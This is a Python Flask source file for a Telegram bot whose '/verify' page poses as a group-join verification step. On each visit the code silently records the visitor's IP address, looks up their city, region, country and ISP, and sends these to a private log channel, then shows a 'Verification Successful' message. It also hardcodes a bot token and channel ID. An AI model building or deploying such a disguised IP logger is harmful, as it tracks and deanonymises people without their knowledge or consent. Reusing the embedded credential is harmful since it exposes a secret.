from flask import Flask, request
import requests
import telebot
import os
from datetime import datetime
import bot as bot_module

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg")
LOG_CHANNEL = os.environ.get("LOG_CHANNEL", "-1002290475903")

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    json_data = request.get_json(force=True)
    update = telebot.types.Update.de_json(json_data)
    bot_module.bot.process_new_updates([update])
    return "OK", 200

@app.route('/verify')
def verify():
    chat_id = request.args.get('chat_id')
    user_id = request.args.get('user_id')
    name = request.args.get('name', 'User')

    if not chat_id or not user_id:
        return "Invalid link.", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    geo = {}
    try:
        geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,lat,lon", timeout=5)
        if geo_resp.status_code == 200:
            geo = geo_resp.json()
    except:
        pass

    location = f"{geo.get('city', 'Unknown')}, {geo.get('regionName', '')} - {geo.get('country', 'Unknown')}"

    log_text = f"""
NEW MEMBER DETECTED

Name: {name}
User ID: {user_id}
IP: {ip}
Location: {location}
ISP: {geo.get('isp', 'Unknown')}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
    """

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"})

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
                  json={"chat_id": chat_id, "user_id": user_id})

    return """
    <h2 style="text-align:center; font-family:sans-serif; margin-top:100px; color:green;">
        Verification Successful<br><br>
        You have been verified and approved to the group.<br>
        Please wait a moment...
    </h2>
    """, 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
